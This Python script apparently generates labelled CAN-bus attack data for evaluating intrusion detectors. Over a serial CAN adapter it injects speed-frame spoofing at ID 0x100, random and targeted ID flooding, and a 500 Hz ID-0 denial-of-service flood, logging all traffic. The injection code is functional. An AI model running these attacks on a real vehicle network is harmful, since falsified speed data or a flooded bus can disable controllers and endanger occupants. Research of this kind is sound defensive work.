#!/usr/bin/env python3
"""Run C: baseline followed by six different attackers (unseen by the strategies), 15 s recovery between them.

Attackers (fixed order, defined before capture):
  1 spoof_low_rate     0x100, speed 180-200,   5 Hz       label spoofing
  2 flood_slow         random IDs 0..0x7FF,   10 Hz       label flooding
  3 spoof_stealth      0x100, speed  95-110,  50 Hz       label spoofing
  4 flood_targeted     8 unknown IDs 0x7E0-7, 100 Hz      label flooding
  5 spoof_mid          0x100, speed 140-160,  20 Hz       label spoofing
  6 dos_id0            ID 0x000,             500 Hz       label flooding
Injected frames are logged to _tx.log at send time; frames observed on the bus go to _rx.log (candump -L format).
"""
import argparse, json, platform, random, threading, time
import can

ap = argparse.ArgumentParser()
ap.add_argument("--out", required=True)
ap.add_argument("--baseline", type=float, default=60)
ap.add_argument("--attack", type=float, default=45)
ap.add_argument("--recovery", type=float, default=15)
ap.add_argument("--seed", type=int, default=2026110503)
ap.add_argument("--port", default="COM9")
a = ap.parse_args()

random.seed(a.seed)
bus = can.Bus(interface="slcan", channel=a.port, bitrate=500000)
rx = open(a.out + "_rx.log", "w", newline="\n")
tx = open(a.out + "_tx.log", "w", newline="\n")
stop = threading.Event()
rx_count = [0]


def rx_loop():
    while not stop.is_set():
        m = bus.recv(timeout=0.2)
        if m is not None:
            rx.write(f"({m.timestamp:.6f}) can0 {m.arbitration_id:03X}#{m.data.hex().upper()}\n")
            rx_count[0] += 1


threading.Thread(target=rx_loop, daemon=True).start()


def frame(kind):
    if kind == "spoof_low_rate":
        return 0x100, bytes([random.randint(180, 200), 0x00, 0x94, 0x11, 0x5F, 0x5B, 0x46, 0x00])
    if kind == "spoof_stealth":
        return 0x100, bytes([random.randint(95, 110), 0x00, 0x94, 0x11, 0x5F, 0x5B, 0x46, 0x00])
    if kind == "spoof_mid":
        return 0x100, bytes([random.randint(140, 160), 0x00, 0x94, 0x11, 0x5F, 0x5B, 0x46, 0x00])
    if kind == "flood_slow":
        return random.randrange(0, 0x800), bytes(random.randrange(256) for _ in range(8))
    if kind == "flood_targeted":
        return 0x7E0 + random.randrange(8), bytes(random.randrange(256) for _ in range(8))
    if kind == "dos_id0":
        return 0x000, bytes(8)
    raise ValueError(kind)


def run_phase(variant, label, dur, rate):
    t0 = time.time()
    end = t0 + dur
    n = errs = 0
    if rate:
        period = 1.0 / rate
        nxt = t0
        while time.time() < end:
            aid, data = frame(variant)
            ts = time.time()
            try:
                bus.send(can.Message(arbitration_id=aid, data=data, is_extended_id=False), timeout=0.1)
                tx.write(f"({ts:.6f}) can0 {aid:03X}#{data.hex().upper()}\n")
                n += 1
            except Exception:
                errs += 1
            nxt += period
            d = nxt - time.time()
            if d > 0:
                time.sleep(d)
    else:
        time.sleep(dur)
    return {"phase": label, "variant": variant, "start_epoch_s": t0, "end_epoch_s": time.time(),
            "planned_s": dur, "rate_hz": rate, "injected_frames": n, "send_errors": errs}


schedule = [("baseline", "baseline", a.baseline, 0)]
for v, lab, rate in (("spoof_low_rate", "spoofing", 5), ("flood_slow", "flooding", 10),
                     ("spoof_stealth", "spoofing", 50), ("flood_targeted", "flooding", 100),
                     ("spoof_mid", "spoofing", 20), ("dos_id0", "flooding", 500)):
    schedule.append((v, lab, a.attack, rate))
    schedule.append(("recovery", "recovery", a.recovery, 0))

phases = []
for variant, label, dur, rate in schedule:
    print(f"[{time.strftime('%H:%M:%S')}] {variant} ({dur:.0f} s, {rate} Hz)", flush=True)
    phases.append(run_phase(variant, label, dur, rate))

time.sleep(0.5)
stop.set()
rx.close(); tx.close(); bus.shutdown()
json.dump({"python": platform.python_version(), "python_can": can.__version__, "port": a.port, "bitrate": 500000,
           "seed": a.seed, "rx_frames": rx_count[0], "phases": phases}, open(a.out + "_phases.json", "w"), indent=2)
print("DONE rx_frames =", rx_count[0], flush=True)
for p in phases:
    if p["injected_frames"]:
        print(f"  {p['variant']:15s} planned={p['planned_s']:.0f}s rate={p['rate_hz']}Hz injected={p['injected_frames']} errs={p['send_errors']}")
